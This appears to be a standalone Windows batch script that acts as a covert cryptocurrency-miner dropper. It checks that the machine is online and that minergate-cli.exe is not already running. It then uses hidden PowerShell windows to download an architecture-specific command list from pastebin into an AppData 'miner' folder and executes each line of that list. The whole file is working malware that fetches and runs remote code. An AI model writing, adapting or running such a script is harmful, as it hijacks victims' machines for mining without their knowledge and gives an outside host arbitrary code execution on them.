@echo off
Ping google.com -n 1 -w 1000
if errorlevel 1 exit
tasklist /FI "IMAGENAME eq minergate-cli.exe" 2>NUL | find /I /N "minergate-cli.exe">NUL && if "%ERRORLEVEL%"=="0" exit
reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL && set OS=32BIT || set OS=64BIT
if %OS%==32BIT powershell.exe -nop -w hidden -c (New-Object System.Net.WebClient).DownloadFile( 'https://pastebin.com/raw/EZ5vTgsB', '%AppData%\miner\miner.txt' )
if %OS%==64BIT powershell.exe -nop -w hidden -c (New-Object System.Net.WebClient).DownloadFile( 'https://pastebin.com/raw/9MhV9PB9', '%AppData%\miner\miner.txt' )
timeout 5
for /F "eol=; tokens=1* delims=" %%i in ( %AppData%\miner\miner.txt ) do call :run %%i 
:run
%*
